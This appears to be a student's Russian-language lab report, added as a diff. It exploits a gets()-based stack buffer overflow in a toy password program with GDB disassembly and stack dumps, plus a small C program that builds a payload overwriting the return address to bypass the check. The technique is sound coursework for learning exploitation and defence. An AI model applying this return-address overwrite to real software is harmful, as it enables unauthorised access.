@@ -1,0 +1,285 @@
+1. Скомпилировал программу с ключами:
+
+user@user-MS-7D22:~/Рабочий стол/Task5$ gcc task5_1_0.c -o task5_1_0 -fno-stack-protector -no-pie
+task5_1_0.c: In function ‘IsPassOk’:
+task5_1_0.c:27:9: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
+   27 |         gets(Pass);
+      |         ^~~~
+      |         fgets
+/usr/bin/ld: /tmp/cc9WoPjE.o: в функции «IsPassOk»:
+task5_1_0.c:(.text+0x71): предупреждение: the `gets' function is dangerous and should not be used.
+user@user-MS-7D22:~/Рабочий стол/Task5$ 
+
+2. Запустил отладчик GDB:
+user@user-MS-7D22:~/Рабочий стол/Task5$ gdb task5_1_0
+GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git
+Copyright (C) 2024 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.
+Type "show copying" and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<https://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+    <http://www.gnu.org/software/gdb/documentation/>.
+
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from task5_1_0...
+
+This GDB supports auto-downloading debuginfo from the following URLs:
+  <https://debuginfod.ubuntu.com>
+Enable debuginfod for this session? (y or [n]) n
+Debuginfod has been disabled.
+To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
+(No debugging symbols found in task5_1_0)
+(gdb) 
+
+3. Вывожу список функций
+(gdb) inf func
+quit
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  _init
+0x0000000000401070  puts@plt
+0x0000000000401080  strcmp@plt
+0x0000000000401090  gets@plt
+0x00000000004010a0  exit@plt
+0x00000000004010b0  _start
+0x00000000004010e0  _dl_relocate_static_pie
+0x00000000004010f0  deregister_tm_clones
+0x0000000000401120  register_tm_clones
+0x0000000000401160  __do_global_dtors_aux
+0x0000000000401190  frame_dummy
+0x0000000000401196  main
+0x00000000004011ee  IsPassOk
+0x000000000040122c  _fini
+(gdb) 
+
+4. анализирую ассемблерный код функции main
+(gdb) disassemble main
+
+Dump of assembler code for function main:
+   0x0000000000401196 <+0>:	endbr64
+   0x000000000040119a <+4>:	push   %rbp				// записать в стек значение из регистра rbp
+   0x000000000040119b <+5>:	mov    %rsp,%rbp			// записать обновленное (в результате предыдущей команды) значение из регистра rsp в регистр rbp	
+   0x000000000040119e <+8>:	sub    $0x10,%rsp // взять адрес хранящийся в регистре rsp и отнять от него 0x10 (16 байт), результат записать обратно в rsp (выделение памяти под локальные переменные функции main)
+   0x00000000004011a2 <+12>:	lea    0xe5b(%rip),%rax        # 0x402004 // в регистр rax записывается адрес ячейки = значение из регистра rip + смещение 0xe5b
+   0x00000000004011a9 <+19>:	mov    %rax,%rdi			// перезаписывается содержимое из регистра общего назначения rax в специальный регистр rdi
+   0x00000000004011ac <+22>:	call   0x401070 <puts@plt>		// вызывается функция puts, в качестве аргумента (указателя на строку) используется адрес из регистра rdi 
+   0x00000000004011b1 <+27>:	call   0x4011ee <IsPassOk>		// вызвать функцию IsPassOk, в результате выполнения которой возвращается значение в регистр eax
+   0x00000000004011b6 <+32>:	mov    %eax,-0x4(%rbp)			// взять содержимое из регистра eax и поместить его в ячейку с адресом = (адрес из регистра rbp минус 0x4)
+   0x00000000004011b9 <+35>:	cmpl   $0x0,-0x4(%rbp)			// сравнить число 0x0 и число из ячейки с адресом = (адрес из регистра rbp минус 0x4)
+   0x00000000004011bd <+39>:	jne    0x4011d8 <main+66>		// если значения не совпали(функция IsPassOk вернула не ноль), то перейти по адресу <main+66>
+   0x00000000004011bf <+41>:	lea    0xe4e(%rip),%rax        # 0x402014// если значения совпали (функция IsPassOk вернула 0), то взять адрес на строку "Bad password!"
+   0x00000000004011c6 <+48>:	mov    %rax,%rdi			 // 
+   0x00000000004011c9 <+51>:	call   0x401070 <puts@plt>		 // вывести строку "Bad password!"
+   0x00000000004011ce <+56>:	mov    $0x1,%edi			 // 	
+   0x00000000004011d3 <+61>:	call   0x4010a0 <exit@plt>		 // завершить программу
+   0x00000000004011d8 <+66>:	lea    0xe43(%rip),%rax        # 0x402022	// номер этой инструкции 0x00000000004011d8 и есть искомый адрес для подмены адреса возврата 
+   										//
+   0x00000000004011df <+73>:	mov    %rax,%rdi				//(записать в регистр rdi адрес на строку "Access granted!")
+   0x00000000004011e2 <+76>:	call   0x401070 <puts@plt>			// вывести строку "Access granted!"
+   0x00000000004011e7 <+81>:	mov    $0x0,%eax				
+   0x00000000004011ec <+86>:	leave
+   0x00000000004011ed <+87>:	ret
+--Type <RET> for more, q to quit, c to continue without paging--
+
+End of assembler dump.
+
+6. анализирую функцию IsPassOk
+
+(gdb) disassemble IsPassOk 
+Dump of assembler code for function IsPassOk:
+   0x00000000004011ee <+0>:	endbr64				//
+   0x00000000004011f2 <+4>:	push   %rbp			// 	
+   0x00000000004011f3 <+5>:	mov    %rsp,%rbp		// 	
+   0x00000000004011f6 <+8>:	sub    $0x10,%rsp		// выделение памяти под локальные переменные 16 байт (я так понял)
+   0x00000000004011fa <+12>:	lea    -0xc(%rbp),%rax		// взять значение из ячейки с адресом (rbp - 0xc) и положить в регистр rax	
+   0x00000000004011fe <+16>:	mov    %rax,%rdi		// переложить данные из регистра rax в  регистр rdi
+   0x0000000000401201 <+19>:	mov    $0x0,%eax		// записать 0 в регистр eax
+   0x0000000000401206 <+24>:	call   0x401090 <gets@plt>	// вызвать функцию ввода строки gets
+   0x000000000040120b <+29>:	lea    -0xc(%rbp),%rax		// записать в регистр rax адрес ячейки (указатель на первую ячейку массива в который функция gets сохраняет строку)
+   0x000000000040120f <+33>:	lea    0xe1c(%rip),%rdx        # 0x402032	// в регистр rdx записывается адрес ячейки = значение из регистра rip + смещение 0xe1c
+   0x0000000000401216 <+40>:	mov    %rdx,%rsi		// переложить данные из регистра rdx в регистр rsi (регистр хранит адрес начала строки 1 для сравнения)
+   0x0000000000401219 <+43>:	mov    %rax,%rdi		// переложить данные из регистра rax в регистр rdi (регистр хранит адрес начала строки 2 (вводим мы) для сравнения)
+   0x000000000040121c <+46>:	call   0x401080 <strcmp@plt>	// вызов функции сравнения строк
+   0x0000000000401221 <+51>:	test   %eax,%eax		// побитовое сравнение двух операндов, это частный случай сравнение  eax с нулем и выставление флага
+   0x0000000000401223 <+53>:	sete   %al			// результат сравнения записать в флаг al
+   0x0000000000401226 <+56>:	movzbl %al,%eax			// переложить данные из al в eax
+   0x0000000000401229 <+59>:	leave				//
+   0x000000000040122a <+60>:	ret				//
+End of assembler dump.
+
+// Из строки 0x000000000040120b <+12>:	lea    -0xc(%rbp),%rax, предполагаю сколько байт можно записать в массив, т.е. 0xc - 12 байт
+// т.к. в регистр rax записывается этот адрес, а затем
+7. Устанавливаю точки остановки программы внутри функций main и IsPassOk:
+ а) на строку main+19, чтобы быть внутри функции:
+(gdb) b *main+19
+Breakpoint 1 at 0x4011a9
+
+ б) на строку IsPassOk+19, до ввода пароля :
+ 
+   (gdb) b *IsPassOk+19 
+   Breakpoint 1 at 0x401201
+
+ в) на строку IsPassOk+43, после ввода пароля, но до вызова функции сравнения:
+ 
+   (gdb) b *IsPassOk+43
+   Breakpoint 2 at 0x401219
+ 
+ 8. Запускаю выполнение программы командой r:
+(gdb) r
+Starting program: /home/user/Рабочий стол/Task5/task5_1_0 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x00000000004011a9 in main ()		// программа остановилась на первой точке остановки
+
+ 9. вывожу информацию о состоянии регистров
+ (gdb) info registers 
+rax            0x402004            4202500
+rbx            0x7fffffffdca8      140737488346280
+rcx            0x403e00            4210176
+rdx            0x7fffffffdcb8      140737488346296
+rsi            0x7fffffffdca8      140737488346280
+rdi            0x1                 1
+rbp            0x7fffffffdb80      0x7fffffffdb80	// я так понимаю, что этот адрес rbp должен будет сохраниться в стеке при вызове функции IsPassOk
+rsp            0x7fffffffdb70      0x7fffffffdb70
+r8             0x0                 0
+r9             0x7ffff7fca380      140737353917312
+r10            0x7fffffffd8a0      140737488345248
+r11            0x203               515
+r12            0x1                 1
+r13            0x0                 0
+r14            0x403e00            4210176
+r15            0x7ffff7ffd000      140737354125312
+rip            0x4011a9            0x4011a9 <main+19>
+eflags         0x202               [ IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+--Type <RET> for more, q to quit, c to continue without paging--
+gs             0x0                 0
+fs_base        0x7ffff7fac740      140737353795392
+gs_base        0x0                 0
+
+ 10.Вывожу содержимое памяти (32 байта = 16 байт (локальные переменные, разница между адресами в rbp и rsp) + 8 байт сохраненный rbp + 8 байт адрес возврата)
+(gdb) x/32xb $rsp
+0x7fffffffdb70:	0x60	0xdc	0xff	0xff	0xff	0x7f	0x00	0x00
+0x7fffffffdb78:	0xa8	0xdc	0xff	0xff	0xff	0x7f	0x00	0x00
+0x7fffffffdb80:	0x20	0xdc	0xff	0xff	0xff	0x7f	0x00	0x00	// сохраненный rbp функции, вызвавшей функцию main
+0x7fffffffdb88:	0xca	0xa1	0xc2	0xf7	0xff	0x7f	0x00	0x00	// адрес возврата в функцию вызвавшую функцию main
+
+11. перехожу к следующей точке остановки
+(gdb) next
+Single stepping until exit from function main,
+which has no line number information.
+Enter password:
+
+Breakpoint 2, 0x0000000000401201 in IsPassOk ()
+
+12. вывожу на экран информацию о регистрах
+(gdb) info registers 
+rax            0x7fffffffdb54      140737488345940
+rbx            0x7fffffffdca8      140737488346280
+rcx            0x7ffff7d1c574      140737351107956
+rdx            0x0                 0
+rsi            0x4052a0            4215456
+rdi            0x7fffffffdb54      140737488345940
+rbp            0x7fffffffdb60      0x7fffffffdb60	// 
+rsp            0x7fffffffdb50      0x7fffffffdb50	// разница между rbp и rsp опять 16 байт
+r8             0x7ffff7e03b20      140737352055584
+r9             0x410               1040
+r10            0x1                 1
+r11            0x202               514
+r12            0x1                 1
+r13            0x0                 0
+r14            0x403e00            4210176
+r15            0x7ffff7ffd000      140737354125312
+rip            0x401201            0x401201 <IsPassOk+19>
+eflags         0x206               [ PF IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+--Type <RET> for more, q to quit, c to continue without paging--
+gs             0x0                 0
+fs_base        0x7ffff7fac740      140737353795392
+gs_base        0x0                 0
+
+13. Вывожу содержимое памяти (32 байта = 16 байт (локальные переменные, разница между адресами в rbp и rsp) + 8 байт сохраненный rbp + 8 байт адрес возврата):
+(gdb) x/32xb $rsp
+0x7fffffffdb50:	0x00	0x3e	0x40	0x00	0x00	0x00	0x00	0x00
+0x7fffffffdb58:	0x00	0xd0	0xff	0xf7	0xff	0x7f	0x00	0x00
+0x7fffffffdb60:	0x80	0xdb	0xff	0xff	0xff	0x7f	0x00	0x00	// 8 байт этой строки - это сохраненный адрес для rbp в функции main 
+0x7fffffffdb68:	0xb6	0x11	0x40	0x00	0x00	0x00	0x00	0x00	// восемь байт  этой строки - это адрес возврата, который надо подменить
+
+14. третью точку остановки использую для того, чтобы убедиться в количестве элементов массива под строку
+(gdb) next						// перехожу к следующей точке остановки
+Single stepping until exit from function IsPassOk,
+which has no line number information.
+3							// записываю 3 (ввожу пароль, число удобное для поиска в содержимом памяти)
+
+Breakpoint 3, 0x0000000000401219 in IsPassOk ()
+
+15. Вывожу содержимое памяти 
+(gdb) x/32xb $rsp
+0x7fffffffdb50:	0x00	0x3e	0x40	0x00	0x33	0x00	0x00	0x00	// пятый байт в этой строке 0x33 - это первая ячейка массива, код цифры "3" из таблицы ASCII
+0x7fffffffdb58:	0x00	0xd0	0xff	0xf7	0xff	0x7f	0x00	0x00
+0x7fffffffdb60:	0x80	0xdb	0xff	0xff	0xff	0x7f	0x00	0x00	// сохраненный rbp функции main
+0x7fffffffdb68:	0xb6	0x11	0x40	0x00	0x00	0x00	0x00	0x00
+
+16. создаю программу, которая формирует последовательность символов (включая непечатные) и с помощью нее сохраняю последовательность в файл out.bin
+//
+
+include <stdio.h>
+void main()
+{
+	// адрес на который указывает rbp в функции main 
+	int rbp7 = 0x00;
+	int rbp6 = 0x00;
+	int rbp5 = 0x7f;
+	int rbp4 = 0xff;
+	int rbp3 = 0xff;
+	int rbp2 = 0xff;
+	int rbp1 = 0xdb;
+	int rbp0 = 0x80;
+		
+	// адрес возврата и
+	int adret7 = 0x00;
+	int adret6 = 0x00;
+	int adret5 = 0x00;
+	int adret4 = 0x00;
+	int adret3 = 0x00;
+	int adret2 = 0x40;
+	int adret1 = 0x11;
+	int adret0 = 0xd8;
+	
+	
+	printf("123456789012%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c", rbp0, rbp1, rbp2, rbp3, rbp4, rbp5, rbp6, rbp7, adret0, adret1, adret2, adret3, adret4, adret5, adret6, adret7);
+	
+}
+
+17. запускаю свою программу и перенаправляю вывод в файл out.txt
+./test > out.txt
+
+18. запускаю программу из задания указав ей перенаправление ввода из файла out.txt
+
+user@user-MS-7D22:~/Рабочий стол/Task5$ ./task5_1_0 < out.txt
+Enter password:
+Access granted!
+Ошибка сегментирования (образ памяти сброшен на диск)
+
+// вроде бы успешно прошло, но возникла ошибка сегментирования (вероятно при освобождении стека занимаемого функцией main)
+// вероятно команда leave дает ошибку 
+
+
+
+
